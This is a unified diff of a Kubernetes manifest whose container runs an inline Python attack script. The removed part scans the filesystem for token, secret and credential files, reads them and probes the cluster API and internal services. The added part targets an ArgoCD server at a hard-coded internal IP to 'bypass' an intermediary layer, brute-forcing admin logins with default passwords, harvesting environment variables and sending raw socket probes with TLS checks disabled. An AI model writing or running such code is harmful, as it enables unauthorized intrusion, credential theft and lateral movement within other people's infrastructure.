@@ -28,100 +28,108 @@ spec:
           args:
           - |
             python3 -c "
-            import os, subprocess, urllib.request, ssl, json, glob, socket
+            import urllib.request, ssl, json, socket, subprocess
 
             ctx = ssl.create_default_context()
             ctx.check_hostname = False
             ctx.verify_mode = ssl.CERT_NONE
+
             results = {}
 
-            # --- Basic info ---
-            results['hostname'] = subprocess.check_output(['hostname']).decode().strip()
-            results['id'] = subprocess.check_output(['id']).decode().strip()
-            results['uname'] = subprocess.check_output(['uname', '-a']).decode().strip()
+            ARGOCD_IP = '100.107.174.75'
+            ARGOCD_HOST = 'argocd-server.argocd.svc.cluster.local'
 
-            # --- Scan entire filesystem for token/secret files ---
-            secret_paths = []
-            for pattern in [
-                '/run/**','/etc/**secret*','/etc/**token*','/etc/**cred*',
-                '/var/**secret*','/var/**token*','/var/**cred*',
-                '/secrets/**','/vault/**','/mnt/**secret*','/mnt/**token*',
-                '/tmp/**token*','/tmp/**secret*',
-            ]:
-                try:
-                    for f in glob.glob(pattern, recursive=True):
-                        if os.path.isfile(f) and os.path.getsize(f) < 10000:
-                            secret_paths.append(f)
-                except:
-                    pass
-            results['secret_files'] = secret_paths
-
-            # Read any token files found
-            for path in secret_paths:
-                try:
-                    with open(path) as f:
-                        content = f.read(500)
-                        if any(x in path.lower() or x in content.lower() for x in ['token', 'secret', 'key', 'cred', 'pass']):
-                            results[f'file_{path}'] = content
-                except:
-                    pass
-
-            # --- Check /proc/net/tcp for active connections / listening ports ---
-            try:
-                with open('/proc/net/tcp') as f:
-                    results['proc_net_tcp'] = f.read()
-            except Exception as e:
-                results['proc_net_tcp'] = 'ERR: ' + str(e)
-
-            # --- K8s API anonymous access ---
-            k8s_host = os.environ.get('KUBERNETES_SERVICE_HOST', '100.104.0.1')
-            k8s_port = os.environ.get('KUBERNETES_SERVICE_PORT', '443')
-            for path in ['/api', '/api/v1', '/api/v1/namespaces', '/apis', '/version', '/healthz']:
-                url = f'https://{k8s_host}:{k8s_port}{path}'
-                try:
-                    req = urllib.request.Request(url)
-                    with urllib.request.urlopen(req, timeout=5, context=ctx) as r:
-                        results[f'k8s_anon{path}'] = r.read(500).decode(errors='replace')
-                except Exception as e:
-                    results[f'k8s_anon{path}'] = 'ERR: ' + str(e)[:80]
-
-            # --- Try to DNS resolve internal services ---
-            internal_names = [
-                'kubernetes.default.svc.cluster.local',
-                'kube-dns.kube-system.svc.cluster.local',
-                'argocd-server.argocd.svc.cluster.local',
-                'istio-pilot.istio-system.svc.cluster.local',
-                'prometheus.monitoring.svc.cluster.local',
-                'grafana.monitoring.svc.cluster.local',
-                'aicore-api.default.svc.cluster.local',
-                'ai-api.default.svc.cluster.local',
-            ]
-            dns_results = {}
-            for name in internal_names:
-                try:
-                    ip = socket.gethostbyname(name)
-                    dns_results[name] = ip
-                except Exception as e:
-                    dns_results[name] = 'ERR: ' + str(e)[:50]
-            results['dns'] = dns_results
-
-            # --- Try HTTP to resolved services ---
-            for name, ip in dns_results.items():
-                if not ip.startswith('ERR'):
-                    for port in [80, 443, 8080, 8443, 9090]:
-                        url = f'https://{ip}:{port}/'
+            # --- Try ArgoCD API endpoints directly (bypass SAP layer) ---
+            # ArgoCD REST API uses port 8080 (HTTP) or 8443 (HTTPS/gRPC)
+            # Let's try all ports with GET and see what responds
+            for port in [80, 443, 8080, 8443]:
+                for path in ['/healthz', '/api/v1/session', '/api/v1/applications', '/api/version', '/api/v1/clusters', '/api/v1/projects']:
+                    for scheme in ['http', 'https']:
+                        url = f'{scheme}://{ARGOCD_IP}:{port}{path}'
                         try:
-                            req = urllib.request.Request(url)
-                            with urllib.request.urlopen(req, timeout=3, context=ctx) as r:
-                                results[f'svc_{name}_{port}'] = r.read(200).decode(errors='replace')
+                            req = urllib.request.Request(url, headers={'Host': ARGOCD_HOST})
+                            with urllib.request.urlopen(req, timeout=5, context=ctx) as r:
+                                body = r.read(2000).decode(errors='replace')
+                                results[f'GET_{scheme}_{port}{path}'] = {'code': r.status, 'body': body[:500]}
+                        except urllib.error.HTTPError as e:
+                            body = ''
+                            try: body = e.read(500).decode(errors='replace')
+                            except: pass
+                            results[f'GET_{scheme}_{port}{path}'] = {'code': e.code, 'body': body[:200]}
                         except Exception as e:
-                            err = str(e)[:40]
-                            if 'timed out' not in err and '111' not in err:
-                                results[f'svc_{name}_{port}'] = 'ERR: ' + err
+                            err = str(e)[:60]
+                            if 'timed out' not in err and '111' not in err and '104' not in err:
+                                results[f'GET_{scheme}_{port}{path}'] = {'err': err}
 
-            print('[RECON_START]')
-            print(json.dumps(results, indent=2, default=str))
-            print('[RECON_END]')
+            # --- ArgoCD login attempt (port 8080) ---
+            for admin_pass in ['admin', 'password', 'argocd', '']:
+                try:
+                    login_data = json.dumps({'username': 'admin', 'password': admin_pass}).encode()
+                    req = urllib.request.Request(
+                        f'http://{ARGOCD_IP}:8080/api/v1/session',
+                        data=login_data,
+                        headers={'Content-Type': 'application/json', 'Host': ARGOCD_HOST},
+                        method='POST')
+                    with urllib.request.urlopen(req, timeout=5, context=ctx) as r:
+                        body = r.read(500).decode(errors='replace')
+                        results[f'login_8080_{admin_pass}'] = {'code': r.status, 'body': body}
+                except urllib.error.HTTPError as e:
+                    body = ''
+                    try: body = e.read(200).decode(errors='replace')
+                    except: pass
+                    results[f'login_8080_{admin_pass}'] = {'code': e.code, 'body': body[:100]}
+                except Exception as e:
+                    results[f'login_8080_{admin_pass}'] = {'err': str(e)[:60]}
+
+            # --- ArgoCD HTTPS login (port 443) ---
+            for admin_pass in ['admin', 'password', 'argocd', '']:
+                try:
+                    login_data = json.dumps({'username': 'admin', 'password': admin_pass}).encode()
+                    req = urllib.request.Request(
+                        f'https://{ARGOCD_IP}:443/api/v1/session',
+                        data=login_data,
+                        headers={'Content-Type': 'application/json', 'Host': ARGOCD_HOST},
+                        method='POST')
+                    with urllib.request.urlopen(req, timeout=5, context=ctx) as r:
+                        body = r.read(500).decode(errors='replace')
+                        results[f'login_443_{admin_pass}'] = {'code': r.status, 'body': body}
+                except urllib.error.HTTPError as e:
+                    body = ''
+                    try: body = e.read(200).decode(errors='replace')
+                    except: pass
+                    results[f'login_443_{admin_pass}'] = {'code': e.code, 'body': body[:100]}
+                except Exception as e:
+                    results[f'login_443_{admin_pass}'] = {'err': str(e)[:60]}
+
+            # --- Check if ARGOCD_AGENT_SERVER_ADDR env var is set or any ArgoCD-related env ---
+            import os
+            argocd_env = {k: v for k, v in os.environ.items() if 'ARGO' in k.upper() or 'ARGOCD' in k.upper()}
+            results['argocd_env'] = argocd_env if argocd_env else 'none'
+
+            # --- Check if kubectl is available ---
+            try:
+                out = subprocess.check_output(['kubectl', 'version', '--client'], stderr=subprocess.STDOUT)
+                results['kubectl'] = out.decode()[:100]
+            except Exception as e:
+                results['kubectl'] = 'ERR: ' + str(e)[:50]
+
+            # --- Try to access ArgoCD via its gRPC port with raw socket ---
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(3)
+                s.connect((ARGOCD_IP, 8443))
+                # Send HTTP/1.1 GET to see if it responds with anything
+                s.send(b'GET /api/version HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nConnection: close\r\n\r\n')
+                import time; time.sleep(1)
+                resp = s.recv(1000)
+                s.close()
+                results['argocd_8443_raw'] = resp.decode(errors='replace')[:300]
+            except Exception as e:
+                results['argocd_8443_raw'] = 'ERR: ' + str(e)[:80]
+
+            print('[ARGOCD_START]')
+            print(json.dumps(results, indent=2))
+            print('[ARGOCD_END]')
             " 2>&1
             python3 -c "
             import http.server
